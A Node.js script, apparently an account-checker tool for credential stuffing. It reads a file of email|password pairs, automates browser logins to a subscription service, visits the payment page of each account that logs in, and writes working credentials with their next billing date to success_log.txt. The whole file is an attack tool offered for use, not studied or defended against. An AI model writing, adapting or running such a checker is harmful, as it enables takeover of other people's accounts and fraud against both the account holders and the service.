const library = require("./lib");
const lib = new library();
const fs = require("async-file");
const readline = require("readline-sync");
// by YarzCode - @ahyarsetiawan34

(async () => {
    let accountList = await readline.question("Account's List? ");
    if(fs.exists(accountList) == false) {
        console.log("[list not found.");
        process.exit(1);
    }
    let contentList = await fs.readFile(accountList, "utf-8");
    let account = contentList.replace("\r").split("\n");
    console.log("[+] Hello you have "+account.length+" List.")
    console.log("[+] Starting Checking the list!");
    console.log("")
    for(let tmp of account) {
        const email = tmp.split("|")[0]
        const pass  = tmp.split("|")[1]
        if(email == undefined || pass === undefined) {
            console.log("[!] List Error : "+email+"|"+pass)
            continue;
        }
        console.log("[-] Let's using account : "+email)
        await lib.initiateBrowser();
        await lib.gotoPage();
        await lib.fillPage(email, pass).then(async res => {
            if(res.error === false) {
                console.log("[+] Login Success")
                await lib.toPaymentPage(email,pass).then(async response => {
                    let contentNextPayment = response.nextPayment.replace("Your next billing date is ", "")
                    if(response.error === false) {
                        let konten = await fs.readFile("success_log.txt", "utf-8");
                        if(konten.includes(response.email) === false) {
                            await fs.appendFile("success_log.txt", response.email+"|"+response.password+"| Next Payment : "+contentNextPayment+"\n", "utf-8");
                        }
                        console.log("[+] Next Payment : "+contentNextPayment)
                    } else {
                        console.log("[+] Unknown error. "+response.message);
                    }
                })
            } else {
                console.log("[!] Login Failed : "+res.message);
            }
        })
        console.log("")
        await lib.killBrowser();
    }

    console.log("==== All work Done - Logs Success Saved on success_log.txt ====")
})();